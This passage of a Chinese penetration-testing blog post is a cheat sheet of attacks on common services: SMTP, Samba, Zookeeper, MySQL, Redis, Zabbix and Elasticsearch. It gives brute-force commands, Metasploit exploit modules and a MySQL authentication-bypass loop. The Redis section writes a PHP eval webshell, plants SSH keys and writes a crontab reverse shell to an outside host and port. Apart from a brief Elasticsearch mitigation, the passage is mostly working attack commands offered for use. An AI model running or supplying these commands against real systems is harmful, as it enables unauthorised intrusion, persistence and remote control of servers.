<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">apt-get install smtp-user-enum
smtp-user-enum -M VRFY -u root -t 202.38.xxx.xxx
smtp-user-enum -M VRFY -U dic.txt -t 202.38.xxx.xxx
smtp-user-enum -M RCPT -u bin -t 202.38.xxx.xxx
smtp-user-enum -M EXPN -u bin -t 202.38.xxx.xxx
</code></pre></td></tr></table>
</div>
</div><h4 id="msf-6">msf</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">auxiliary/scanner/smtp/smtp_enum
</code></pre></td></tr></table>
</div>
</div><h3 id="暴力破解-1">暴力破解</h3>
<h4 id="hydra-2">hydra</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hydra -l msfadmin -P passwd.txt smtp://IP
</code></pre></td></tr></table>
</div>
</div><h2 id="samba-漏洞">Samba 漏洞</h2>
<h3 id="samba-简介">Samba 简介</h3>
<p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个免费软件，由服务器及客户端程序构成。</p>
<h3 id="smb-简介">SMB 简介</h3>
<p>SMB(Server Messages Block，信息服务块)是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。</p>
<p>SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置 <code>NetBIOS over TCP/IP</code> 使得 Samba 不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。</p>
<h3 id="smb-信息泄露">SMB 信息泄露</h3>
<h4 id="msf-7">msf</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">auxiliary/scanner/smb/smb_version
</code></pre></td></tr></table>
</div>
</div><h4 id="nmap-1">nmap</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -p <span class="m">445</span> IP
nmap -sV -v -p <span class="m">445</span> --script<span class="o">=</span>smb-vuln*
</code></pre></td></tr></table>
</div>
</div><h4 id="nmblookup">nmblookup</h4>
<p>nmblookup 用于查询 NetBIOS 名称，并使用基于 TCP/IP 的 NetBIOS 查询将它们映射到网络中的 IP 地址。这些选项允许将名称查询定向到特定的 IP 广播区域或特定的机器。所有查询都通过 UDP 完成。</p>
<p>nmblookup 是用于枚举域/工作站和 MAC 地址的有用命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nmblookup -A 192.168.1.139
</code></pre></td></tr></table>
</div>
</div><h4 id="nbtscan">nbtscan</h4>
<p>扫描在本地或远程 TCP/IP 网络上 NetBIOS 打开的名称服务器，因为这是查找打开共享的第一步</p>
<p>可以在整个子网中工作，而不是在单个 IP 上工作</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nbtscan 192.168.1.1/24
</code></pre></td></tr></table>
</div>
</div><h4 id="smbmap">SMBMap</h4>
<p>SMBMap 允许用户枚举整个域中的 samba 共享驱动器。列出共享驱动器，驱动器权限，共享内容，上载/下载功能，文件名自动下载模式匹配，甚至执行远程命令。旨在简化大型网络中潜在敏感数据的搜索。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">smbmap -H 192.168.1.139
smbmap -H 192.168.1.139 -u msfadmin -p msfadmin
</code></pre></td></tr></table>
</div>
</div><h3 id="暴力破解-2">暴力破解</h3>
<h4 id="hydra-3">hydra</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">hydra -L user.txt -P pass.txt -v smb://ip
</code></pre></td></tr></table>
</div>
</div><h3 id="命令执行">命令执行</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">search smb 3.0.20
use exploit/multi/samba/usermap_script
</code></pre></td></tr></table>
</div>
</div><h2 id="zookeeper">Zookeeper</h2>
<h3 id="zookeeper-简介">Zookeeper 简介</h3>
<p>Zookeeper 是一个分布式服务框架，是 Apache Hadoop 的一个子项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。</p>
<h3 id="环境搭建">环境搭建</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
tar -xzvf zookeeper-3.4.14.tar.gz
mv zoo_sample.cfg zoo.cfg
./zkServer.sh start
</code></pre></td></tr></table>
</div>
</div><h3 id="未授权访问">未授权访问</h3>
<p>Zookeeper 默认未设置密码，在未进行任何访问控制情况下，攻击者可通过执行 env 命令获得系统大量的敏感信息，包括系统名称、Java 环境。</p>
<p>Zookeeper 默认端口开启在 2181 端口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">netstat -an <span class="p">|</span> grep 2181
nmap -sV -p 2181 IP
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nc IP 2181
</code></pre></td></tr></table>
</div>
</div><ul>
<li>envi
<ul>
<li>打印有关服务环境的详细信息</li>
</ul>
</li>
<li>stat
<ul>
<li>列出关于性能和连接客户端的统计信息</li>
</ul>
</li>
<li>ruok
<ul>
<li>测试服务器是否运行在非错误状态</li>
</ul>
</li>
<li>reqs
<ul>
<li>列出未完成的请求</li>
</ul>
</li>
<li>dump
<ul>
<li>列出未完成的会话和临时节点</li>
</ul>
</li>
</ul>
<p>图形化界面工具：</p>
<ul>
<li>ZooInspector</li>
</ul>
<h2 id="mysql-漏洞">Mysql 漏洞</h2>
<h3 id="mysql-简介">Mysql 简介</h3>
<p>Mysql 数据库是目前世界上使用最为广泛的数据库之一，很多著名公司和站点都使用Mysql 作为其数据库支撑</p>
<p>目前很多架构都以 Mysql 作为数据库管理系统，例如 LAMP、和 WAMP 等</p>
<h3 id="mysql-信息收集">Mysql 信息收集</h3>
<h4 id="版本信息">版本信息</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nmap:
nmap -sV -p 3306 IP
msf:
use auxiliary/scanner/mysql/mysql_version
</code></pre></td></tr></table>
</div>
</div><h4 id="其它相关信息">其它相关信息</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/admin/mysql/mysql_enum
</code></pre></td></tr></table>
</div>
</div><h3 id="mysql-密码破解">Mysql 密码破解</h3>
<h4 id="hydra-4">hydra</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">hydra -L user.txt -P password.txt -v mysql://IP
</code></pre></td></tr></table>
</div>
</div><h4 id="msf-8">msf</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/scanner/mysql/mysql_login
</code></pre></td></tr></table>
</div>
</div><h3 id="mysql-漏洞利用">Mysql 漏洞利用</h3>
<h4 id="mysql-身份认证漏洞cve-2012-2122">MySQL 身份认证漏洞(CVE-2012-2122)</h4>
<p><a href="https://seclists.org/oss-sec/2012/q2/493" target="_blank" rel="noopener noreffer">https://seclists.org/oss-sec/2012/q2/493</a></p>
<p>memcmp() 的返回值都在[127，-128]之内，把两个字符串逐个字符的比较，如果找到不一样的，就把这两个字符相减后返回</p>
<p>memcmp()返回 0 的时候 check_scramble() 认证通过</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512142357.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512142357.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512142357.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512142357.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512142357.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512142357.png-water_print" /></p>
<h4 id="漏洞利用">漏洞利用</h4>
<p>msf：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/scanner/mysql/mysql_authbypass_hashdump
</code></pre></td></tr></table>
</div>
</div><p>Linux shell:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> 1000<span class="sb">`</span><span class="p">;</span><span class="k">do</span> mysql -uroot -pwrong -h IP -P3306<span class="p">;</span><span class="k">done</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="redis">Redis</h2>
<h3 id="redis-简介">redis 简介</h3>
<p>Redis是大家常说的非关系型数据库中的一种，是一个开源的使用 ANSI 语言编写、支持网络可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的API</p>
<p>Redis 与 memcached 一样，为了保证效率，数据都是缓存在内存中。但 Redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave (主从)同步。</p>
<h3 id="redis-未授权访问漏洞">redis 未授权访问漏洞</h3>
<p>默认的配置是使用 6379 端口，没有密码。这时候会导致未授权访问读写 Redis 数据。</p>
<h4 id="在-web-目录下写入-webshell">在 web 目录下写入 Webshell</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">config <span class="nb">set</span> dir /var/www/html
config <span class="nb">set</span> dbfilename webshell.php
<span class="nb">set</span> webshell <span class="s2">&#34;&lt;?php phpinfo();?&gt;&#34;</span>
save

</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512150346.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512150346.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512150346.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512150346.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512150346.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200512150346.png-water_print" /></p>
<p>当数据库过大时，redis 写 shell 的小技巧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
<span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;webshell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">);</span>
<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s1">&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;</span><span class="p">);</span>
<span class="k">exit</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><h4 id="写-ssh-公钥">写 ssh 公钥</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa
<span class="nb">cd</span> .ssh
<span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; 1.txt
cat 1.txt <span class="p">|</span> redis-cli -h ip -x <span class="nb">set</span> payload
config <span class="nb">set</span> dir /root/.ssh
config <span class="nb">set</span> dbfilename authorized_keys
save
</code></pre></td></tr></table>
</div>
</div><h4 id="写-crontab">写 crontab</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">redis-cli -h 192.168.0.104
<span class="nb">set</span> xxx <span class="s2">&#34;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.104/4444 0&gt;&amp;1\n\n&#34;</span>
config <span class="nb">set</span> dir /var/spool/cron
config <span class="nb">set</span> dbfilename root
save
</code></pre></td></tr></table>
</div>
</div><h3 id="利用-redis-主从复制-rce">利用 redis 主从复制 rce</h3>
<p><a href="https://geekby.xyz/2019/07/15/redis-ji-yu-zhu-cong-fu-zhi-de-rce-li-yong-fang-shi/" target="_blank" rel="noopener noreffer">https://geekby.xyz/2019/07/15/redis-ji-yu-zhu-cong-fu-zhi-de-rce-li-yong-fang-shi/</a></p>
<h2 id="zabbix-漏洞">Zabbix 漏洞</h2>
<h3 id="zabbix-简介">Zabbix 简介</h3>
<p>Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 ServerClient 架构。可用于监视各种网络服务、服务器和网络机器等状态。</p>
<p>使用各种 Database-end 如：MySQL，PostgreSQL，SQLite，Oracle IBM DB2 储存资料。Server 端基于 C 语言、Web管理端 frontend 则是基于 PHP 所制作的。Zabbix 可以使用多种方式监视。可以只使用 Simple Check 不需要安装 client 端，亦可基于 SMTP 或 HTTP 各种协定做死活监视。</p>
<p>在客户端如 UNIX， Windows 中安装 Zabbix Agent 之后，可监视 CPU Load、网络使用状况、硬盘容量等各种状态。而就算没有安装 Agent 在监视对象中，Zabbix 也可以经由 SNMP、TCP、IMP、利用 PMI、SSH、 telnet 对目标进行监视。</p>
<p>另外， Zabbix 包含 XMPP 等各种 Item 警示功能</p>
<h3 id="zabbix-sql-注入漏洞">Zabbix SQL 注入漏洞</h3>
<p><a href="https://geekby.xyz/2019/03/01/zabbix-latest.php-sql-zhu-ru-lou-dong/" target="_blank" rel="noopener noreffer">https://geekby.xyz/2019/03/01/zabbix-latest.php-sql-zhu-ru-lou-dong/</a></p>
<h3 id="zabbix-命令执行利用">Zabbix 命令执行利用</h3>
<p>管理员在安装配置 Zabbix 过程中，使用了弱口令或默认的用户名与口令。如：<code>Admin/zabbix</code>，这样，Zabbix服务器的用户认证就形同虚设。攻击者可以创建 <code>system.run[command,]</code> 监控项执行命令，甚至获取服务器 shell，进行各种挖矿行为。</p>
<p><a href="https://www.jianshu.com/p/675b6385b7c0" target="_blank" rel="noopener noreffer">https://www.jianshu.com/p/675b6385b7c0</a></p>
<h2 id="elasticsearch-漏洞">Elasticsearch 漏洞</h2>
<h3 id="elasticsearch-简介">Elasticsearch 简介</h3>
<p>Elasticsearch 是一个分布式、高扩展、高实时的搜索与数据分析引擎。它能很方便的使大量数据具有搜索、分析和探索的能力。充分利用 Elasticsearch 的水平伸缩性，能使数据在生产环境变得更有价值。</p>
<p>Elasticsearch 的实现原理主要分为以下几个步骤，首先用户将数据提交到 Elasticsearch 数据库中，再通过分词控制器去将对应的语句分词，将其权重和分词结果一并存入数据，当用户搜索数据时候，再根据权重将结果排名，打分，再将返回结果呈现给用户。</p>
<h3 id="elasticsearch-未授权访问漏洞">Elasticsearch 未授权访问漏洞</h3>
<p>Elasticsearch 是 java 编写的企业级搜索服务，启动此服务默认会开放 <code>HTTP 9200</code> 端口，可被非法操作数据。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nmap -sV -p 9200 IP
</code></pre></td></tr></table>
</div>
</div><ul>
<li><a href="http://IP:9200/" target="_blank" rel="noopener noreffer">http://IP:9200/</a></li>
<li><a href="http://IP:9200/_nodes" target="_blank" rel="noopener noreffer">http://IP:9200/_nodes</a>
<ul>
<li>查看节点数据</li>
</ul>
</li>
<li><a href="http://IP:9200/_cat" target="_blank" rel="noopener noreffer">http://IP:9200/_cat</a></li>
</ul>
<p>默认开启的 9200 端口和使用的端口不对外公布，或架设内网环境。或者防火墙上设置禁止外网访问 9200 端口为 elasticsearch 增加登录验证，可以使用官方推荐的shield 插件，该插件为收费插件，可试用 30 天，免费的可以使用 elasticsearch-http-basic，searchquard 插件</p>
<h3 id="cve-2014-3120">CVE-2014-3120</h3>
<p><a href="https://geekby.xyz/2019/06/08/elasticsearch-ming-ling-zhi-xing-lou-dong/" target="_blank" rel="noopener noreffer">https://geekby.xyz/2019/06/08/elasticsearch-ming-ling-zhi-xing-lou-dong/</a></p>
<h3 id="cve-2015-1427">CVE-2015-1427</h3>
<p><a href="https://geekby.xyz/2019/06/08/elasticsearch-groovy-sha-he-rao-guo/" target="_blank" rel="noopener noreffer">https://geekby.xyz/2019/06/08/elasticsearch-groovy-sha-he-rao-guo/</a></p>
<h3 id="cve-2015-3337">CVE-2015-3337</h3>
<p><a href="https://geekby.xyz/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong/" target="_blank" rel="noopener noreffer">https://geekby.xyz/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong/</a></p>
<h3 id="cve-2015-5531">CVE-2015-5531</h3>
<p><a href="https://geekby.xyz/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong-1/" target="_blank" rel="noopener noreffer">https://geekby.xyz/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong-1/</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2020-05-13</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/" data-title="常见服务类漏洞"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/" data-title="常见服务类漏洞"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/" data-title="常见服务类漏洞"><i class="fab fa-skype fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>,&nbsp;<a href="/tags/%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/">服务漏洞</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/" class="prev" rel="prev" title="域渗透之 Windows Access Token 攻击"><i class="fas fa-angle-left fa-fw"></i>域渗透之 Windows Access Token 攻击</a>
            <a href="/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/" class="next" rel="next" title="SaltStack 远程命令执行漏洞复现（CVE-2020-11651）">SaltStack 远程命令执行漏洞复现（CVE-2020-11651）<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
